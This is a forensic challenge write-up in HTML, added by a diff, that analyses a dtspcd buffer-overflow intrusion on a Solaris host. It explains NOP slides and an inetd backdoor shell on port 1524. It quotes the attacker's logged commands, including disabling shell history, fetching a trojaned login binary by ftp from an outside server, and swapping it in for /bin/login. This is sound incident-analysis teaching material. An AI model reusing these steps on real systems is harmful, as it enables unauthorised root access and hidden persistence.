@@ -1,0 +1,234 @@
+<html><head></head>
+<body><h2 align="center">
+	Scan 20 - Forensic Challenge
+</h2>
+<h4 align="center">
+	Submitted by J. Pierce (<a href="mailto:IncidentGuy@attbi.com"> IncidentGuy@attbi.com</a>)
+</h4>
+<ol start="1" type="1">
+	<li>
+	<b>
+		What is a NOP slide, and how is this one different from the NOP slide in the rpc.statd exploit in Scan10?
+	</b>	
+ 	<p>
+ 		A NOP slide is the mechanism used to increase the chances of having a buffer overflow succeed.  
+		As Aleph One points out in "<i>Smashing the Stack for Fun &amp; Profit</i>" from <u>Phrack 49</u>, " Trying to guess the offset even while
+	 	knowing where the beginning of the stack lives is nearly impossible."  So rather than 
+	 	try and determine the exact offset where the return address pointer will be returned, 
+	 	we pad the front of our buffer overflow with NOP instructions in the hopes of having 
+	 	the return address pointer fall somewhere within the range of NOPs and "fall thru" 
+	 	them until it reaches the code/commands we've embedded.  See <a href="http://www.phrack.org/show.php?p=49&amp;a=14">http://www.phrack.org/show.php?p=49&amp;a=14</a> 
+     	for the tutorial.
+	
+	</p><p>
+		In this particular instance, the NOP is four bytes consisting of hex values "80 1C 40 11"
+		which means it is targeting the Sparc Solaris environment.  (Each architecture type has 
+		a different NOP code within the assembly code)  The NOP used in scan10 was one which is 
+		associated with the X86 (Intel) environment and consists of a single byte with the hex value of "90".
+	</p>	
+</li></ol>
+
+<ol start="2" type="1">
+	<li>
+	<b>
+		The attack was on 08 Jan, 2002.  Would Snort have generated an alert then for the attack?
+	</b>
+	<p>	
+		Snort would have seen the attack as the NOP slide should have triggered an alert.  As this
+		was the first documented instance that this particular exploit existed much less was being
+		actively used, a alert specific to the attack (dtspcd overflow) would not have been generated.
+	</p>
+	</li>
+</ol>
+
+<ol start="3" type="1">
+	<li>
+	<b>
+		In the exploit code, the command "/bin/sh sh -i" is given, what is its purpose and why is 'sh' shown twice?
+	</b>
+	<p>
+		The attack was creating a "stand-alone" configuration file to be run against inetd in
+		order to spawn an interactive shell (hence the "sh -i") on the ingreslock port (port 1524).  
+		The inetd daemon requires the following information when spawning services:
+	</p>
+ <ul type="disc">
+  <li>The
+      "service name" which is either the name of a "known" service (contained
+      within the /etc/services file) or hardcoded to a specific port.  In this instance
+	  they are referencing the "ingreslock" port, or port 1524;</li>
+  <li>TLI or transport layer=Stream;</li>
+  <li>Protocol to be used by this service.  In this instance TCP;</li>
+  <li>Flags=nowait;</li>
+  <li>The user ID with which the commands will be run;</li>
+  <li>The pathname to the program being called;</li>
+  <li>And finally, the arguments being passed;</li>
+ </ul>
+</li></ol>
+
+<ol start="4" type="1">
+ 	<li>
+	<b>
+		The attacker executed a variety of commands on the hacked Solaris box.  Which commands
+		were automated by the exploit, and which commands were manual by the attacker himself?
+	</b>
+	<p>
+		The exploit appears to break down into two primary phases.  The first phase involves
+		the creation of a backdoor.  This is done by overflowing the buffer within the dtspcd
+		program and causing a file called "x" to be created in the /tmp directory.  The overflow
+		then invokes a stand-alone instance of inetd to run against this file, opening a backdoor
+		interactive root shell on port 1524.  The exploit program sleeps for 10 seconds to 
+		ensure the /tmp/x file was read by inetd, and it finally removes the backdoor file to help
+		cover our attacker's tracks.
+	</p>
+	<p>
+		I believe that the successful connection to port 1524 and the "cascading" commands 
+		dumped there are the secondary phase of the successful attack program.  (Who would
+		manually type out a command line that long and include a quoted string?)
+	</p>
+	<p>
+		So during the secondary phase, the attacking program issues the following commands:
+	</p>
+	<p>
+		uname -a;ls -l /core /var/dt/tmp/DTSPCD.log;PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/usr/ccs/bin:/usr/gnu/bin;
+		export PATH;echo "BD PID(s): "`ps -fed|grep '-s /tmp/x' | grep -v grep |awk '{print $2}'`
+	</p>
+	<p>
+	<b>
+		Explanation:
+	</b>
+	</p>
+	<p>
+		Basically the attack program is returning the system name and operating system, checking
+		to see if the exploit has created a core file or if logging was being performed by the 
+		dtspcd daemon, setting a specific command search path and then trying to determine the 
+		process ID's of the backdoor instances of inetd.  (Looking for the tell-tale "-s /tmp/x"
+		which is the argument given to run inetd in a standalone mode using the /tmp/x file.  
+		(Which opens up port 1524 with an interactive shell as noted above)
+	</p>
+	<p>
+	<b>
+		The commands manually performed by the attacker:
+	</b>
+	</p>
+	<p>
+	<table>
+		<tbody><tr>
+				<td>w</td>
+				<td>(determine who is logged into the box)</td>
+		</tr>
+		<tr>
+				<td>unset HISTFILE</td>
+				<td>(trying to make sure their commands aren't being saved out to a shell history file)</td>
+		</tr>
+		<tr>
+				<td>cd /tmp</td>
+				<td>(get into a good temporary working directory)</td>
+		</tr>
+		<tr>
+				<td>mkdir /usr/lib</td>
+				<td>(make sure our chosen "storage" spot exists)</td>
+		</tr>
+		<tr>
+				<td>mv /bin/login /usr/lib/libfl.k </td>
+				<td>(move the legitimate version of /bin/login out of the way)</td>
+		</tr>
+		<tr>
+				<td>ftp 64.224.118.115</td>
+				<td>(go to our "home" server to get our tools and replacement files)</td>
+		</tr>
+		<tr>
+				<td>cd pub</td>
+				<td>(change directories to where our files are stored)</td>
+		</tr>
+		<tr>
+				<td>binary</td>
+				<td>(make sure we are transferring in binary more or our executables probably won't work)</td>
+		</tr>
+		<tr>
+				<td>get sun1</td>
+				<td>(get our file "sun1" - we find out later what it is)</td>
+		</tr>
+		<tr>
+				<td>bye</td>
+				<td>(close our ftp connection)</td>
+		</tr>
+		<tr>
+				<td>ls</td>
+				<td>(verify
+that we have our file and depending on how paranoid our intruder is, verify
+that the "x" file from our exploit is actually gone)</td>
+		</tr>
+		<tr>
+				<td>chmod 555 sun1</td>
+				<td>(make our program executable)</td>
+		</tr>
+		<tr>
+				<td>mv sun1 /bin/login</td>
+				<td>(ah!  "sun1" is a login replacement program!)</td>
+		</tr>
+	</tbody></table>
+</p></li></ol>
+<ol start="5" type="1">
+	<li>
+	<p>
+	<b>
+		What is sun1, and how does it work?
+	</b>
+	</p>
+	
+		The "sun1" file is a replacement of the /bin/login binary.  Most replacements of this
+		sort have an embedded backdoor which will allow our attacker to get back into the box
+		anytime they want as root with no logging enabled of their access.  Some of these 
+		backdoors are password based, others check for specific incoming environment variables,
+		others could be hard-coded with one or more "trusted" hosts.  Some versions will also 
+		have a login/password recorder which will log the incoming logins and passwords which our
+	    attacker can then collect at a later date.
+	<p>
+		The only recognizable data returned from the "attacking/testing" IP address
+		is the terminal type "ANSI".  No indication of success is shown in the dumps, 
+		so we are unable to determine if this is the key to the backdoor or not.
+	</p>
+</li></ol>
+
+<ol start="6" type="1">
+	<li>
+	<p>
+	<b>
+		What did you learn from this exercise?
+	</b>
+	</p>
+    	While I understood the basic concepts of buffer overflows, I had never really taken 
+		the time to review the code and see how they were accomplished.  While I knew that
+		NOPs were of use in detecting buffer overflows, I didn't really understand the role 
+		they played or why they differed based on the architecture of the system being attacked.
+	</li>
+</ol>
+
+<ol start="7" type="1">
+	<li>
+	<p>
+	<b>
+		How long did this challenge take you?
+	</b>
+	</p>
+ 	Perhaps two hours to review the actual exploit, do some research on buffer overflows and how
+	they function, and then to write the initial document.  Another hour or so to translate everything into html.</li>
+</ol>
+
+<ol>
+
+<b>Bonus Question:</b>
+<p>
+	One of the commands executed during the attack is
+	<i>
+	echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'`
+	</i> What is the purpose of this command and what does 'BD' stand for?
+</p>
+
+<b>Answer:</b>
+<p>
+	The attack program is trying to determine the process ID's of the backdoor instances
+	of inetd.  In this case, only a single process ID (3476) is returned.  The "BD" probably
+	stands for "back door".
+</p>
+</ol></body></html>
